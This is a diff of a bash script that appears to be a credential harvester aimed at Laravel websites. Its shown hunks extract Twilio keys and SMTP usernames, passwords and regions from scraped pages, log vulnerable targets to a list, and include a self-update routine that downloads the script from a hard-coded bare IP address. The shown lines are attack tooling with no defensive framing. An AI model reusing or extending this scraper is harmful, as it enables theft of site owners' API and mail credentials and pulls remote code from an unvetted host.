@@ -10,7 +10,7 @@ NOR="\e[0m"
 LM='\e[41m'
 LB='\e[100m'
 LK='\e[43m'
-CX=`cat tmp/$0 | sha256sum`
+CX=`cat $0 | sha256sum`
 CZ=`curl "http://103.146.202.117/cdg.txt" -s | sha256sum`
 
 trap ctrl_c INT
@@ -24,7 +24,7 @@ function ctrl_c() {
 }
 
 echo ""
-cat tmp/<<COUP
+cat <<COUP
 ,---,---,---,---,---,---,---,---,---,---,---,---,---,-------,
 | ~ | 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9 | 0 | [ | ] | <-    |
 |---'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-----|
@@ -130,9 +130,9 @@ TWILIO2=$(cat tmp/km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 
 TW1=$(cat tmp/tw.htm | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
 TW2=$(cat tmp/tw1.htm | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
 TW3=$(cat tmp/tw3.htm | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
-USER1=$(cat tmp/ses1.htm | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
-PASS1=$(cat tmp/ses2.htm | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
-REG1=$(cat tmp/ses3.htm | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
+USER1=$(cat ses1.htm | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
+PASS1=$(cat ses2.htm | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
+REG1=$(cat ses3.htm | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
  if [[ -z $KTH || $KTH =~ "null" || $KTH =~ "localhost" || $KTH =~ "mailtrap.io" || $KTH =~ "smtp.mailtrap.io" ]]; then
                 echo "${TARGET}" >> cms/laravel.txt
         else
@@ -172,7 +172,7 @@ echo ""
 read -r -p "Mau diupdate dulu gak? [y/N] " response
 case "$response" in
     [yY][eE][sS]|[yY]) 
-CX=`cat tmp/$0 | sha256sum`
+CX=`cat $0 | sha256sum`
 CZ=`curl "http://103.146.202.117/cdg.txt" -s | sha256sum`
 	if [[ $CX != $CZ ]]; then
 		echo "Updating script... Please wait."
